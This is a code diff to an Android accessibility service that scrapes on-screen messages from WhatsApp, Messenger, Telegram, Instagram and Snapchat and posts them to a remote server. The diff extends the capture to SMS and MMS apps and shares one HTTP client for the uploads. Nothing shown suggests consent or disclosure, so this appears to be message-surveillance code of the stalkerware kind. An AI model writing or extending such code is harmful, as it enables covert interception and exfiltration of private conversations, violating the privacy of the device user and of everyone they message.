@@ -20,6 +20,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     companion object {
         var channel: MethodChannel? = null
+        val httpClient = OkHttpClient()
     }
 
     // Duplicate messages rokne ke liye
@@ -62,13 +63,17 @@ class MyAccessibilityService : AccessibilityService() {
                 if (url != null) sendUrl(url)
             }
         }
+        
 
         // Chat Monitoring 
+        
         val chatAppName = when {
             packageName.contains("whatsapp")  -> "WhatsApp"
             packageName.contains("messenger") -> "Messenger"
             packageName.contains("telegram")  -> "Telegram"
             packageName.contains("instagram") -> "Instagram"
+            packageName.contains("messaging")  -> "SMS"
+            packageName.contains("mms")        -> "SMS"
             packageName.contains("snapchat")  -> "Snapchat"
             else -> null
         }
@@ -129,7 +134,7 @@ class MyAccessibilityService : AccessibilityService() {
             "type a message", "message", "search", "reply",
             "forward", "delete", "copy", "share", "online",
             "yesterday", "today", "delivered", "read", "sent",
-            "type a message...", "aa", "bb"
+            "type a message...", "aa", "bb","type message", "new message", "send", "mms", "sms"
         )
         return labels.contains(text.lowercase())
     }
@@ -168,8 +173,10 @@ class MyAccessibilityService : AccessibilityService() {
                     .post(body)
                     .build()
 
-                val response = client.newCall(request).execute()
-                Log.d("ChatMonitor", "Sent  | Response: ${response.code}")
+                httpClient.newCall(request).execute().use { response ->
+                Log.d("ChatMonitor", "Sent | Response: ${response.code}")
+            } 
+                
 
             } catch (e: Exception) {
                 Log.e("ChatMonitor", "Send failed: ${e.message}")
